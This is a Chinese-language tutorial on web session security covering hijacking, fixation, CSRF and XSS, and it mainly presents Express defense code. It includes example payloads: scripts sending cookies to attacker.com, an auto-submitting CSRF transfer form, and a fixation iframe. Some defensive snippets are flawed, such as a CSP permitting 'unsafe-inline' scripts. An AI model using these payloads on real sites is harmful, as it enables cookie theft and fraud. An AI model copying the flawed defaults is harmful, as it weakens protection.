---
title: 8、Session安全威胁防护
---
## 📚 目录

1. [Session认证回顾与安全威胁概述](#1-Session认证回顾与安全威胁概述)
2. [会话劫持攻击与防护](#2-会话劫持攻击与防护)
3. [会话固定攻击与防护](#3-会话固定攻击与防护)
4. [CSRF攻击与防御](#4-CSRF攻击与防御)
5. [XSS攻击与防御](#5-XSS攻击与防御)
6. [Cookie安全属性配置](#6-Cookie安全属性配置)
7. [Session安全最佳实践](#7-Session安全最佳实践)
8. [Session方案优缺点分析](#8-Session方案优缺点分析)
9. [核心要点总结](#9-核心要点总结)

---

## 1. 🔐 Session认证回顾与安全威胁概述


### 1.1 Session认证工作原理


> 💡 **Session是什么？**
> 
> Session就像餐厅的**取餐号牌**。你点餐后，服务员给你一个号牌，凭这个号牌可以取餐。服务器给浏览器一个SessionID，浏览器凭这个ID证明身份。

**基础流程**：
```
用户登录流程：
浏览器 → [用户名+密码] → 服务器
服务器 → [验证成功，生成SessionID] → 存储到服务器内存
服务器 → [Set-Cookie: sessionid=abc123] → 浏览器

后续访问流程：
浏览器 → [Cookie: sessionid=abc123] → 服务器  
服务器 → [查找Session信息] → 确认用户身份
```

### 1.2 Session面临的主要安全威胁


| 🚨 威胁类型 | **攻击原理** | **危害程度** | **防护难度** |
|------------|-------------|-------------|-------------|
| 🎭 **会话劫持** | `窃取用户的SessionID` | `⭐⭐⭐⭐⭐` | `中等` |
| 🔒 **会话固定** | `强制用户使用指定SessionID` | `⭐⭐⭐⭐` | `容易` |
| 🌐 **CSRF攻击** | `利用用户身份执行恶意操作` | `⭐⭐⭐⭐⭐` | `中等` |
| 💉 **XSS攻击** | `注入恶意脚本窃取Cookie` | `⭐⭐⭐⭐⭐` | `较难` |
| 👤 **中间人攻击** | `网络传输中截获数据` | `⭐⭐⭐⭐` | `容易` |

### 1.3 威胁关系图


```
Session安全威胁体系：

网络层威胁              应用层威胁              浏览器威胁
     |                      |                      |
中间人攻击 ←→ Session传输 ←→ 会话劫持 ←→ Cookie窃取
     |                      |                      |
  HTTPS防护              固定攻击                XSS注入
     |                      |                      |
证书验证                CSRF攻击              恶意脚本
```

---

## 2. 🎭 会话劫持攻击与防护


### 2.1 什么是会话劫持


> 🔍 **通俗解释**：
> 
> 会话劫持就像**小偷偷了你的门卡**。你用门卡刷卡进小区，小偷复制了你的门卡，也能冒充你进入小区。

**攻击原理**：
```
正常用户访问：
用户 → [Cookie: sessionid=abc123] → 服务器 ✅

攻击者劫持后：
攻击者 → [Cookie: sessionid=abc123] → 服务器 ❌
服务器误认为是正常用户！
```

### 2.2 常见劫持方式


**🌐 网络嗅探攻击**：
```
场景：用户在咖啡厅连接公共WiFi

攻击流程：
1. 用户连接不安全的WiFi
2. 攻击者监听网络流量
3. 捕获HTTP请求中的Cookie
4. 攻击者使用stolen cookie访问网站

防护方案：强制HTTPS传输
```

**💻 XSS脚本窃取**：
```javascript
// 恶意脚本示例（仅供理解，切勿使用）
<script>
// 窃取Cookie并发送给攻击者
var cookie = document.cookie;
var img = new Image();
img.src = "http://attacker.com/steal?cookie=" + cookie;
</script>
```

**🦠 恶意软件攻击**：
- 浏览器插件窃取
- 键盘记录器
- 本地文件读取

### 2.3 劫持防护措施


**🔒 传输加密防护**：
```javascript
// 强制HTTPS配置
app.use((req, res, next) => {
  if (!req.secure && req.get('x-forwarded-proto') !== 'https') {
    return res.redirect('https://' + req.get('host') + req.url);
  }
  next();
});
```

**⏰ Session超时设置**：
```javascript
// 设置Session过期时间
app.use(session({
  maxAge: 30 * 60 * 1000,  // 30分钟过期
  rolling: true,            // 每次访问重置过期时间
}));
```

**🔄 定期更新SessionID**：
```javascript
// 敏感操作后重新生成SessionID
app.post('/change-password', (req, res) => {
  // 验证旧密码...
  // 更新密码...
  
  // 重新生成SessionID防止劫持
  req.session.regenerate((err) => {
    if (err) throw err;
    req.session.userId = userId;
    res.json({success: true});
  });
});
```

---

## 3. 🔒 会话固定攻击与防护


### 3.1 什么是会话固定攻击


> 🎯 **形象比喻**：
> 
> 就像**小偷提前在你家门上贴了一张假门牌号**，然后告诉你"这是你家新门牌号"，你用了这个号码，小偷也知道这个号码，就能冒充你了。

**攻击步骤**：
```
会话固定攻击流程：

1. 攻击者访问网站获取SessionID
   攻击者 → 网站 → [sessionid=malicious123]

2. 攻击者诱导用户使用这个SessionID
   恶意链接：http://bank.com/login?sessionid=malicious123

3. 用户用这个SessionID登录
   用户 → [登录成功] → 服务器绑定malicious123

4. 攻击者使用同样的SessionID访问
   攻击者 → [sessionid=malicious123] → 已登录状态！
```

### 3.2 攻击示例场景


**📧 邮件诱导攻击**：
```
攻击者发送邮件：
"亲爱的用户，请点击链接验证账户：
https://yourbank.com/login?JSESSIONID=FIXED123"

用户点击并登录后，攻击者也能用FIXED123访问用户账户
```

**🌐 恶意网站攻击**：
```html
<!-- 攻击者网站上的恶意代码 -->
<iframe src="https://target.com/login?sessionid=ATTACKER_ID"></iframe>
<script>
// 诱导用户跳转到目标网站登录
window.open('https://target.com/login?sessionid=ATTACKER_ID');
</script>
```

### 3.3 固定攻击防护


**🔄 登录时重新生成SessionID**：
```javascript
// 登录成功后立即重新生成SessionID
app.post('/login', async (req, res) => {
  const {username, password} = req.body;
  
  // 验证用户凭据
  const user = await validateUser(username, password);
  if (!user) {
    return res.status(401).json({error: '用户名或密码错误'});
  }
  
  // ⭐ 关键：重新生成SessionID
  req.session.regenerate((err) => {
    if (err) throw err;
    
    // 设置新的Session数据
    req.session.userId = user.id;
    req.session.username = user.username;
    req.session.loginTime = new Date();
    
    res.json({success: true, message: '登录成功'});
  });
});
```

**🚫 拒绝URL中的SessionID**：
```javascript
// 检查并拒绝URL参数中的SessionID
app.use((req, res, next) => {
  // 如果URL中包含sessionid参数，重定向到干净的URL
  if (req.query.sessionid || req.query.JSESSIONID) {
    const cleanUrl = req.path;
    return res.redirect(cleanUrl);
  }
  next();
});
```

**🔐 Session验证检查**：
```javascript
// 验证Session的合法性
app.use((req, res, next) => {
  if (req.session && req.session.userId) {
    // 检查Session创建时间，防止过期Session
    const sessionAge = Date.now() - new Date(req.session.loginTime).getTime();
    const maxAge = 24 * 60 * 60 * 1000; // 24小时
    
    if (sessionAge > maxAge) {
      req.session.destroy();
      return res.status(401).json({error: 'Session已过期'});
    }
  }
  next();
});
```

---

## 4. 🌐 CSRF攻击与防御


### 4.1 什么是CSRF攻击


> 🎭 **通俗解释**：
> 
> CSRF就像**有人冒充你的身份发短信**。你手机还在身边，但坏人用你的身份给别人发消息，银行以为真的是你在操作。

**CSRF全称**：Cross-Site Request Forgery（跨站请求伪造）

### 4.2 CSRF攻击原理


**攻击流程图**：
```
CSRF攻击完整流程：

1. 用户正常登录银行网站
   用户 → 银行网站 → [设置Cookie: sessionid=user123]

2. 用户访问恶意网站（未退出银行网站）
   用户 → 恶意网站 → [加载恶意页面]

3. 恶意网站自动向银行发起请求
   恶意网站 → [携带用户Cookie] → 银行网站

4. 银行网站误认为是用户操作
   银行网站 → [执行转账操作] → 资金被盗
```

### 4.3 CSRF攻击示例


**💰 银行转账攻击**：
```html
<!-- 恶意网站的页面代码 -->
<h1>恭喜您中奖了！</h1>

<!-- 隐藏的恶意表单，自动提交 -->
<form id="evil-form" action="https://bank.com/transfer" method="POST" style="display:none;">
  <input name="to_account" value="attacker_account">
  <input name="amount" value="10000">
</form>

<script>
// 页面加载后自动提交表单
document.getElementById('evil-form').submit();
</script>
```

**📧 恶意邮件修改**：
```html
<!-- 看似无害的图片，实际是GET请求 -->
<img src="https://email.com/delete-all?confirm=yes" width="1" height="1">

<!-- 用户一打开邮件，所有邮件就被删除了！ -->
```

### 4.4 CSRF防御措施


**🎫 CSRF Token防护**：
```javascript
// 生成CSRF Token
const crypto = require('crypto');

app.use((req, res, next) => {
  if (!req.session.csrfToken) {
    req.session.csrfToken = crypto.randomBytes(32).toString('hex');
  }
  res.locals.csrfToken = req.session.csrfToken;
  next();
});

// 验证CSRF Token
app.post('/transfer', (req, res) => {
  const submittedToken = req.body.csrfToken;
  const sessionToken = req.session.csrfToken;
  
  if (!submittedToken || submittedToken !== sessionToken) {
    return res.status(403).json({error: 'CSRF Token验证失败'});
  }
  
  // 执行正常的转账逻辑...
});
```

**🍪 SameSite Cookie属性**：
```javascript
// 设置SameSite属性防止跨站请求
app.use(session({
  cookie: {
    sameSite: 'strict',  // 严格模式：完全禁止跨站请求
    // sameSite: 'lax',   // 宽松模式：允许安全的跨站请求
    httpOnly: true,
    secure: true,        // 仅HTTPS传输
  }
}));
```

**🔍 Referer检查**：
```javascript
// 检查请求来源
app.use('/api', (req, res, next) => {
  const referer = req.get('Referer');
  const allowedHosts = ['https://yoursite.com', 'https://www.yoursite.com'];
  
  if (referer && !allowedHosts.some(host => referer.startsWith(host))) {
    return res.status(403).json({error: '非法的请求来源'});
  }
  
  next();
});
```

---

## 5. 💉 XSS攻击与防御


### 5.1 什么是XSS攻击


> 🦠 **形象比喻**：
> 
> XSS攻击就像**在你常去的咖啡厅里放了一台偷听设备**。你以为环境是安全的，但实际上你说的话都被偷听了。

**XSS全称**：Cross-Site Scripting（跨站脚本攻击）

### 5.2 XSS攻击类型


**📝 存储型XSS（最危险）**：
```javascript
// 恶意用户在评论中提交恶意脚本
评论内容：
"这个产品不错！<script>
var cookie = document.cookie;
fetch('http://attacker.com/steal', {
  method: 'POST',
  body: 'stolen=' + cookie
});
</script>"

// 其他用户查看评论时，脚本自动执行，Cookie被窃取
```

**🔗 反射型XSS**：
```
恶意链接：
https://vulnerable-site.com/search?q=<script>alert('XSS')</script>

用户点击链接 → 脚本在用户浏览器执行
```

**📄 DOM型XSS**：
```javascript
// 脆弱的前端代码
function search() {
  var query = location.search.split('q=')[1];
  document.getElementById('result').innerHTML = '搜索结果：' + query;
}

// 恶意URL：site.com/search.html?q=<img src=x onerror=alert('XSS')>
```

### 5.3 XSS防御措施


**🧹 输入过滤与转义**：
```javascript
// HTML特殊字符转义
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
}

// 使用示例
app.post('/comment', (req, res) => {
  const safeComment = escapeHtml(req.body.comment);
  // 存储转义后的内容
  saveComment(safeComment);
});
```

**🔒 HttpOnly Cookie**：
```javascript
// 设置HttpOnly防止脚本访问Cookie
app.use(session({
  cookie: {
    httpOnly: true,    // 禁止JavaScript访问Cookie
    secure: true,      // 仅HTTPS传输
    sameSite: 'strict' // 防止CSRF
  }
}));
```

**🛡️ 内容安全策略（CSP）**：
```javascript
// 设置CSP头部
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', 
    "default-src 'self'; " +
    "script-src 'self' 'unsafe-inline'; " +
    "style-src 'self' 'unsafe-inline'; " +
    "img-src 'self' data: https:;"
  );
  next();
});
```

---

## 6. 🍪 Cookie安全属性配置


### 6.1 Cookie安全属性详解


> 🔐 **Cookie安全属性**就像给**包裹贴安全标签**，告诉快递员这个包裹需要特殊处理方式。

| 🏷️ 属性名 | **作用说明** | **安全价值** | **使用场景** |
|-----------|-------------|-------------|-------------|
| `HttpOnly` | `禁止JavaScript访问` | `防止XSS窃取Cookie` | `所有认证Cookie` |
| `Secure` | `仅HTTPS传输` | `防止网络窃听` | `生产环境必需` |
| `SameSite` | `限制跨站请求` | `防止CSRF攻击` | `现代浏览器推荐` |

### 6.2 HttpOnly属性


**🚫 防止脚本访问**：
```javascript
// 设置HttpOnly Cookie
res.cookie('sessionId', sessionId, {
  httpOnly: true,  // 关键设置
  maxAge: 24 * 60 * 60 * 1000 // 24小时
});

// JavaScript无法访问HttpOnly Cookie
console.log(document.cookie); // 不会显示sessionId
```

**对比示例**：
```javascript
// ❌ 危险：普通Cookie可被脚本访问
res.cookie('token', 'abc123'); 
// 脚本可以：document.cookie 获取到token

// ✅ 安全：HttpOnly Cookie无法被脚本访问
res.cookie('token', 'abc123', {httpOnly: true});
// 脚本无法获取token值
```

### 6.3 Secure属性


**🔒 强制HTTPS传输**：
```javascript
// 生产环境Cookie配置
const isProduction = process.env.NODE_ENV === 'production';

app.use(session({
  cookie: {
    secure: isProduction,  // 生产环境强制HTTPS
    httpOnly: true,
    maxAge: 30 * 60 * 1000
  }
}));
```

### 6.4 SameSite属性


**🛡️ 跨站请求控制**：
```javascript
// SameSite属性选项
app.use(session({
  cookie: {
    sameSite: 'strict',  // 最严格：禁止所有跨站请求
    // sameSite: 'lax',   // 宽松：允许顶级导航
    // sameSite: 'none',  // 无限制：需要配合Secure使用
  }
}));
```

**SameSite模式对比**：
```
Strict模式：
用户从 google.com 点击链接到 yoursite.com
→ Cookie不会被发送（最安全）

Lax模式：
用户从 google.com 点击链接到 yoursite.com
→ Cookie会被发送（用户体验好）
恶意网站通过POST请求攻击
→ Cookie不会被发送（防护CSRF）

None模式：
→ 所有情况都发送Cookie（需要Secure）
```

### 6.5 完整安全配置


```javascript
// 生产环境推荐配置
app.use(session({
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,        // 防止XSS
    secure: true,          // 强制HTTPS
    sameSite: 'strict',    // 防止CSRF
    maxAge: 30 * 60 * 1000 // 30分钟过期
  },
  name: 'sid',             // 自定义cookie名称
}));
```

---

## 7. 🛡️ Session安全最佳实践


### 7.1 强制Session过期与重新生成


**⏰ 智能过期策略**：
```javascript
// 多层次过期控制
app.use((req, res, next) => {
  if (req.session && req.session.userId) {
    const now = Date.now();
    const lastActivity = req.session.lastActivity || now;
    const loginTime = req.session.loginTime || now;
    
    // 绝对过期：24小时后必须重新登录
    if (now - loginTime > 24 * 60 * 60 * 1000) {
      req.session.destroy();
      return res.status(401).json({error: '登录已过期，请重新登录'});
    }
    
    // 相对过期：30分钟无活动自动过期
    if (now - lastActivity > 30 * 60 * 1000) {
      req.session.destroy();
      return res.status(401).json({error: '会话超时，请重新登录'});
    }
    
    // 更新最后活动时间
    req.session.lastActivity = now;
  }
  next();
});
```

**🔄 敏感操作重新验证**：
```javascript
// 敏感操作需要重新验证身份
app.post('/change-password', (req, res) => {
  const {currentPassword, newPassword} = req.body;
  
  // 验证当前密码
  if (!validateCurrentPassword(req.session.userId, currentPassword)) {
    return res.status(403).json({error: '当前密码错误'});
  }
  
  // 执行密码修改
  updatePassword(req.session.userId, newPassword);
  
  // 重新生成SessionID，踢出其他会话
  req.session.regenerate((err) => {
    if (err) throw err;
    req.session.userId = req.session.userId;
    res.json({success: true, message: '密码修改成功，请重新登录其他设备'});
  });
});
```

### 7.2 Session存储优化


**💾 安全存储选择**：
```javascript
// Redis存储配置（推荐生产环境）
const RedisStore = require('connect-redis')(session);
const redis = require('redis');
const client = redis.createClient({
  host: 'localhost',
  port: 6379,
  password: process.env.REDIS_PASSWORD
});

app.use(session({
  store: new RedisStore({client: client}),
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true,
    httpOnly: true,
    maxAge: 30 * 60 * 1000
  }
}));
```

### 7.3 并发Session控制


**👥 限制同时登录设备**：
```javascript
// 限制用户同时登录的设备数量
const userSessions = new Map(); // 生产环境使用Redis

app.post('/login', async (req, res) => {
  const user = await validateUser(req.body.username, req.body.password);
  if (!user) {
    return res.status(401).json({error: '登录失败'});
  }
  
  // 检查已有会话数量
  const existingSessions = userSessions.get(user.id) || [];
  if (existingSessions.length >= 3) {
    // 踢出最旧的会话
    const oldestSession = existingSessions.shift();
    // 通知旧会话失效...
  }
  
  // 生成新会话
  req.session.regenerate((err) => {
    if (err) throw err;
    req.session.userId = user.id;
    
    // 记录新会话
    existingSessions.push(req.sessionID);
    userSessions.set(user.id, existingSessions);
    
    res.json({success: true});
  });
});
```

### 7.4 安全配置检查清单


> ✅ **Session安全检查清单**

**基础安全配置**：
- [ ] ✅ 使用HTTPS传输
- [ ] ✅ 设置Cookie HttpOnly属性
- [ ] ✅ 设置Cookie Secure属性
- [ ] ✅ 配置SameSite属性
- [ ] ✅ 设置合理的过期时间
- [ ] ✅ 使用强随机数生成SessionID

**高级安全措施**：
- [ ] ✅ 登录后重新生成SessionID
- [ ] ✅ 敏感操作前验证身份
- [ ] ✅ 实现智能过期策略
- [ ] ✅ 限制并发登录数量
- [ ] ✅ 记录安全日志
- [ ] ✅ 定期安全审计

**监控和响应**：
- [ ] ✅ 监控异常登录行为
- [ ] ✅ 检测会话劫持迹象
- [ ] ✅ 实现紧急会话撤销
- [ ] ✅ 用户异常行为通知

---

## 8. ⚖️ Session方案优缺点分析


### 8.1 Session方案优势


**✅ 主要优点**：

| 🌟 优势 | **详细说明** | **适用场景** |
|--------|-------------|-------------|
| **🔒 安全性高** | `服务器控制Session数据，客户端无法篡改` | `金融、电商等高安全要求` |
| **💾 状态管理** | `服务器端存储完整用户状态信息` | `复杂业务逻辑应用` |
| **🎛️ 精确控制** | `可以随时撤销、修改用户权限` | `企业级权限管理` |
| **📊 详细记录** | `可记录用户详细行为和状态变化` | `审计要求严格的系统` |

### 8.2 Session方案缺陷


**❌ 主要缺点**：

| 🚨 劣势 | **问题描述** | **影响程度** |
|--------|-------------|-------------|
| **🎯 扩展性差** | `Session存储在单台服务器，难以水平扩展` | `⭐⭐⭐⭐⭐` |
| **💰 资源消耗** | `服务器需要存储大量Session数据` | `⭐⭐⭐⭐` |
| **📱 移动端不友好** | `移动APP难以维护Cookie状态` | `⭐⭐⭐⭐` |
| **🌐 跨域复杂** | `多域名或微服务架构下共享困难` | `⭐⭐⭐⭐⭐` |

### 8.3 适用场景分析


**🎯 Session方案最适合**：
```
传统Web应用：
✅ 单体应用架构
✅ 用户量适中（< 10万并发）
✅ 安全要求高
✅ 复杂的用户状态管理

典型场景：
• 企业内部管理系统
• 银行网银系统  
• 电商后台管理
• 在线教育平台
```

**❌ Session方案不适合**：
```
现代分布式应用：
❌ 微服务架构
❌ 移动APP为主
❌ 跨域名访问
❌ 高并发场景（> 10万）

典型场景：
• 移动端API服务
• 微服务架构
• 跨域单页应用
• 高并发互联网产品
```

### 8.4 与其他方案对比


```
认证方案对比分析：

                Session-Cookie    JWT Token    OAuth 2.0
扩展性           ⭐⭐             ⭐⭐⭐⭐⭐       ⭐⭐⭐⭐
安全性           ⭐⭐⭐⭐⭐         ⭐⭐⭐         ⭐⭐⭐⭐
移动端支持       ⭐⭐             ⭐⭐⭐⭐⭐       ⭐⭐⭐⭐⭐
实现复杂度       ⭐⭐             ⭐⭐⭐         ⭐⭐⭐⭐⭐
服务器负载       ⭐⭐             ⭐⭐⭐⭐⭐       ⭐⭐⭐⭐
状态管理         ⭐⭐⭐⭐⭐         ⭐⭐           ⭐⭐⭐
```

---

## 9. 📋 核心要点总结


### 9.1 必须掌握的安全威胁


```
🔐 Session安全威胁Top 5：
1. 🎭 会话劫持 - 窃取SessionID冒充用户身份
2. 🔒 会话固定 - 强制用户使用指定SessionID  
3. 🌐 CSRF攻击 - 利用用户身份执行恶意操作
4. 💉 XSS攻击 - 注入脚本窃取Cookie信息
5. 👤 中间人攻击 - 网络传输中截获敏感数据
```

### 9.2 关键防护措施


**🛡️ 核心防护策略**：
```
传输安全：
• 强制HTTPS加密传输
• 禁用HTTP明文协议
• 验证SSL证书有效性

Cookie安全：
• HttpOnly - 防止XSS窃取
• Secure - 仅HTTPS传输  
• SameSite - 防止CSRF攻击

Session管理：
• 登录后重新生成SessionID
• 设置合理过期时间
• 敏感操作重新验证
• 限制并发登录数量
```

### 9.3 实施建议


**🎯 安全实施优先级**：

**⭐⭐⭐⭐⭐ 最高优先级（必须实施）**：
- 强制HTTPS传输
- Cookie HttpOnly属性
- 登录重新生成SessionID
- 基础Session过期控制

**⭐⭐⭐⭐ 高优先级（建议实施）**：
- SameSite Cookie属性
- CSRF Token防护
- XSS输入过滤
- 安全监控日志

**⭐⭐⭐ 中等优先级（条件允许）**：
- 并发Session控制
- 智能过期策略
- 详细安全审计
- 用户行为分析

### 9.4 技术选型指导


> 💡 **什么时候选择Session？**

**✅ 推荐使用Session**：
- 传统Web应用（主要通过浏览器访问）
- 安全要求极高的系统（金融、医疗）
- 复杂的用户状态管理需求
- 单体应用架构
- 用户量可控的企业内部系统

**❌ 不推荐Session**：
- 移动端为主的应用
- 微服务分布式架构
- 高并发互联网产品
- 需要跨域访问的SPA应用
- API优先的现代应用

**核心记忆**：
- Session安全防护重在**多层防御**
- **HTTPS + HttpOnly + SameSite** 是基础三件套
- **登录重新生成SessionID** 是防固定攻击的关键
- **输入过滤 + CSP** 是防XSS的有效手段
- Session适合**传统Web**，不适合**现代移动端**